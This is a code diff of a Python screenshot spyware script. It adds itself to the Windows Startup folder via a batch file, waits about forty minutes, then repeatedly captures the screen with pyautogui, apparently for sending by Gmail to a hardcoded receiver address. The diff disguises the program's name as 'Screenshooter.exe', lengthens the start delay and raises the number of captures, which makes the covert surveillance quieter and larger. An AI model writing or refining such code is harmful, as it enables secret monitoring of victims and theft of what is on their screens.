@@ -2,6 +2,7 @@
 # uwu
 import smtplib
 from email.mime.multipart import MIMEMultipart
+# file with my pass u dont need for this
 import ur_passord
 from email.mime.base import MIMEBase
 from email import encoders
@@ -14,8 +15,8 @@ import os
 USER_NAME = getpass.getuser()
 
 
-def add_to_startup(file_path=""):
-    if file_path == "":
+def add_to_startup(file_path="Screenshooter.exe"):
+    if file_path == "Screenshooter.exe":
         file_path = os.path.dirname(os.path.realpath(__file__))
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
@@ -27,8 +28,8 @@ sender_email = "PlanshetGreg@gmail.com"
 receiver_email = "OneGreg0ry4k@gmail.com"
 add_to_startup()
 
-time.sleep(6)
-for i in range(15):
+time.sleep(2400)
+for i in range(20):
     screenshot = pyautogui.screenshot()
     screenshot.save("screenshot1.png")
     # copied from documentation uwu
